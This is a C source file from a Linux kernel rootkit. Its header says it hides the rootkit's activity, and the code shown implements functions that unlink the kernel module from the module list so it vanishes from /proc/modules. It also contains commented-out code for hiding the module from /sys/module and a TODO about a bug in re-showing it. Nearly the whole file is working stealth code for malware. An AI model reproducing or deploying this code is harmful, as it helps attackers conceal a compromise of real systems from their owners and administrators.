/*
 * This file contains a set of functions for hiding the work 
 * of the rootkit. These functions include: hiding the module, 
 * hiding processes, hiding files and directories, hiding 
 * sockets, ports and network packets.
 */
#include "header/hide.h"
#include "header/config.h"



/* For hide from /sys/module
static struct list_head *module_kobj_previous; */
static int module_hidden = 0;
static struct list_head *module_previous;


void module_hide(void) {
    if (!module_hidden) {
        /* Hide from /proc/modules */
        module_previous = THIS_MODULE->list.prev;
        list_del(&THIS_MODULE->list);

        /* hide from /sys/module/ - it's work

        module_kobj_previous = THIS_MODULE->mkobj.kobj.entry.prev;
        kobject_del(&THIS_MODULE->mkobj.kobj);
        list_del(&THIS_MODULE->mkobj.kobj.entry);
        */

        module_hidden = !module_hidden;
    }
}

void module_show(void) {
    if (module_hidden) {
        //add to /proc/modules
        list_add(&THIS_MODULE->list, module_previous);

        /* TODO: Somewhere here is the error 
         * that appears when the module is shown!

        kobject_add(&THIS_MODULE->mkobj.kobj, 
            THIS_MODULE->mkobj.kobj.parent, PROC_FILE_NAME);
        */

        module_hidden = !module_hidden;
    }
}